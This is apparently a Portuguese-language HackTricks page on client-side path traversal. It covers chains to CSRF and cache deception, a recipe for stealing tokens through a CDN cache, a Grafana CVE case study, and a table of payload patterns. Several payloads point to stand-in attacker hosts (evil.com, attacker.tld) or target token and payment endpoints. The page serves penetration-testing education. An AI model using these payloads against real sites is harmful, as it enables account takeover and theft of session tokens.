# Client Side Path Traversal

{{#include ../banners/hacktricks-training.md}}

## Informações Básicas

A client side path traversal ocorre quando você pode **manipular o path de uma URL** que vai ser **enviada para um usuário visitar de forma legítima** ou que o usuário será de alguma forma **forçado a visitar, por exemplo via JS ou CSS**. CSPT é também conhecida como **On-Site Request Forgery (OSRF)** porque permite coagir o browser da vítima a acessar paths arbitrários na mesma origem com seus cookies, JWTs, ou certificados mTLS.

Fontes típicas (dados que você controla):

- Parâmetros de rota que são concatenados em paths de `fetch()` ou XHR (React Router, Next.js dynamic routes, Vue router params, Angular `ActivatedRoute`).
- Valores armazenados (profile slugs, document IDs) que são interpolados em paths dentro de background jobs, service workers, ou WebSocket URLs.
- Gadgets de UI (download/export buttons, image galleries) que acrescentam fragments controlados pelo usuário ou extensões de arquivo a endpoints da API antes da requisição ser disparada.

Sinks típicos (onde a traversal termina):

- Frontend API wrappers que prefixam `/api/` ou `/proxy/` e reutilizam headers de auth automaticamente.
- `history.pushState` / `router.navigate` helpers que reconstruem URLs mais tarde durante a hydration.
- `<link>`/`<style>`/`@import` statements gerados por conteúdo de CMS ou payloads de feature-flag.

### Impactos comuns & cadeias

- **CSPT ➜ CSRF/OSRF**: sequestrar chamadas autenticadas `POST/PUT/DELETE` escapando o path do recurso pretendido e então acessando endpoints sensíveis (redefinição de senha, aprovação de pagamento, revogação de acesso). Combine com o checklist [CSRF](csrf-cross-site-request-forgery.md) para escalar.
- **CSPT ➜ cache deception / poisoning**: servir JSON controlado pelo atacante a partir de chaves CDN públicas e reproduzi-lo sem autenticação. Veja [Cache Poisoning and Cache Deception](cache-deception/README.md).
- **CSPT ➜ Open Redirect ➜ XSS/SSRF**: a traversal atinge um endpoint de open redirect, que então redireciona para infraestrutura do atacante que serve JS malicioso ou payloads SSRF. Encadeie com abusos de [Open Redirect](open-redirect.md).

### Exemplos de descobertas

- In [**this writeup**](https://erasec.be/blog/client-side-path-manipulation/), foi possível **alterar a URL de convite** de forma que acabasse **cancelando um cartão**.
- In [**this writeup**](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html), foi possível combinar um **client side path traversal via CSS** (foi possível alterar o path de onde um recurso CSS era carregado) com um **open redirect** para carregar o recurso CSS de um **domínio controlado pelo atacante**.
- In [**this writeup**](https://blog.doyensec.com/2024/07/02/cspt2csrf.html), é mostrado uma técnica de como abusar de CSPT **para realizar um ataque CSRF**. Isso é feito monitorando todos os dados que um atacante pode controlar (URL path, parâmetros, fragment, dados injetados no DB...) **e os sinks** onde esses dados terminam (requisições sendo feitas).
- Check [**this browser extension**](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/) para monitorar isso.
- Check this [**CSPT playground**](https://github.com/doyensec/CSPTPlayground) para testar a técnica.
- Check [**this tutorial**](https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html) sobre como usar a extensão do browser no playground.

## CSPT-assisted web cache poisoning/deception

CSPT pode ser encadeado com caching baseado em extensões de CDN para exfiltrar JSON sensível leaked por chamadas de API autenticadas:

- Um frontend concatena input controlado pelo usuário em um path de API e anexa headers de autenticação em fetch/XHR.
- Ao injetar dot-segments (../) você pode retargetar a requisição autenticada para um endpoint diferente na mesma origem.
- Se aquele endpoint (ou uma variante de path com um sufixo com aparência estática como .css) for cacheado pelo CDN sem variar conforme os headers de auth, a resposta autenticada da vítima pode ser armazenada sob uma chave de cache pública e recuperada por qualquer um.

Receita rápida:

1) Encontre código SPA que constrói URLs de API a partir de parâmetros de path enquanto envia headers de auth.  
2) Identifique endpoints sensíveis e teste sufixos estáticos (.css, .js, .jpg, .json) para ver se o CDN passa para Cache-Control: public/max-age e X-Cache: Hit enquanto retorna JSON.  
3) Isole a vítima em uma URL que injete traversal no parâmetro da SPA para que o fetch autenticado acerte a variante de path cacheável (por exemplo, ../../../v1/token.css).  
4) Leia a mesma URL anonimamente para obter o segredo cacheado (token → ATO).

Veja detalhes e mitigações na página de Cache Deception: [Cache Poisoning and Cache Deception](cache-deception/README.md).

## Fluxo de investigação & ferramentas

### Descoberta passiva com proxies interceptores

- **Correlacione sources/sinks automaticamente**: o [CSPT Burp extension](https://github.com/doyensec/CSPTBurpExtension) analisa seu histórico de proxy, agrupa parâmetros que são posteriormente refletidos dentro dos paths de outras requisições, e pode reemitir URLs proof-of-concept com tokens canário para confirmar traversals exploráveis. Após carregar o JAR, ajuste o `Source Scope` para parâmetros do cliente (ex.: `id`, `slug`) e os `Sink Methods` para `GET, POST, DELETE` para que a extensão destaque builders de requisição perigosos. Você pode exportar todas as fontes suspeitas com um canário embutido para validá-las em massa.
- **Procure por double-URL-decoding**: enquanto navega com Burp ou ZAP, fique atento a padrões `/api/%252e%252e/` que são normalizados pelo frontend antes de chegar à rede — esses geralmente aparecem como corpos JSON codificados em base64 referenciando route state e são fáceis de ignorar sem um scanner automatizado.

### Instrumentando sinks de SPA manualmente

Inserir um snippet curto no DevTools ajuda a revelar traversals ocultos enquanto você interage com a UI:
```javascript
(() => {
const origFetch = window.fetch;
window.fetch = async function (input, init) {
if (typeof input === "string" && /\.\.\//.test(input)) {
console.log("[CSPT candidate]", input, init?.method || "GET");
debugger;
}
return origFetch.apply(this, arguments);
};
})();
```
- Adicione wrappers similares em torno de `XMLHttpRequest.prototype.open`, `history.pushState` e routers específicos de frameworks (por exemplo, `next/router`). Observar `init.credentials === "include"` reduz rapidamente as requisições que trazem cookies de sessão.
- Se a app armazenar dicas de roteamento em IndexedDB/localStorage, edite essas entradas com payloads de traversal e recarregue — o estado mutado frequentemente é reinjetado em requisições pré-hydration.

### Laboratório e ensaio de payloads

- Levante o CSPT Playground com `docker compose up` e pratique encadear traversal ➜ CSRF ➜ stored XSS sem tocar no alvo. Reproduzir a estrutura do router do alvo localmente facilita criar PoCs compartilháveis.
- Mantenha um bloco de notas com variações bem-sucedidas de dot-segment (`..;/`, `%2e%2e/`, `%2e./%2e/`, UTF-8 homoglyphs) e truques de sufixo (`.css`, `.json`, `;` matrix params) observados durante o recon para reproduzi-los rapidamente quando surgir um novo sink.

## Estudos de caso recentes (2025)

- **Grafana OSS CVE-2025-4123/6023 (v11.5.0+)** – Um gadget de traversal dentro de `/public/plugins/` permitiu que atacantes contrabandeassem `../../` para o plugin asset loader, encadeassem isso com o open redirect do Grafana e forçassem vítimas a carregar bundles de plugin controlados pelo atacante. Quando dashboards anônimos estavam habilitados, uma URL forjada como `https://grafana.example.com/public/plugins/../../../../..//evil.com/poc/module.js` resultava no navegador executando JavaScript remoto; se o Image Renderer plugin estivesse instalado, o mesmo primitivo poderia ser convertido em SSRF ao redirecionar requisições de rendering para hosts internos. Sempre teste caminhos de assets de plugin, dashboards anônimos e endpoints do renderer juntos porque um único traversal frequentemente te dá ângulos tanto de XSS quanto de SSRF.

## Receitas de payloads

| Objetivo | Padrão de payload | Notas |
| --- | --- | --- |
| Hit sibling API under same origin | `?doc=../../v1/admin/users` | Funciona quando routers simplesmente concatenam `/${doc}`. Adicione `.json` se o CDN só cachear assets com aparência estática. |
| Forçar a SPA a seguir o open redirect | `?next=..%2f..%2f..%2flogin/callback/%3FreturnUrl=https://attacker.tld/x` | Combine com redirecionadores confiáveis listados no codebase do alvo. Encadeie com [Open Redirect](open-redirect.md). |
| Abusar do cache de CDN baseado em extensão | `?file=../../v1/token.css` | CDN may treat `.css` as static and cache secrets returned as JSON. |
| CSRF via mudança de verbo | `?action=../../payments/approve/.json&_method=POST` | Alguns routers aceitam overrides `_method`; combine com traversal para re-targeting de endpoints destrutivos. |

## References

- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Grafana CVE-2025-4123 Chained Path Traversal + Open Redirect Analysis](https://www.cve.news/cve-2025-4123/)
- [Doyensec CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension)

{{#include ../banners/hacktricks-training.md}}
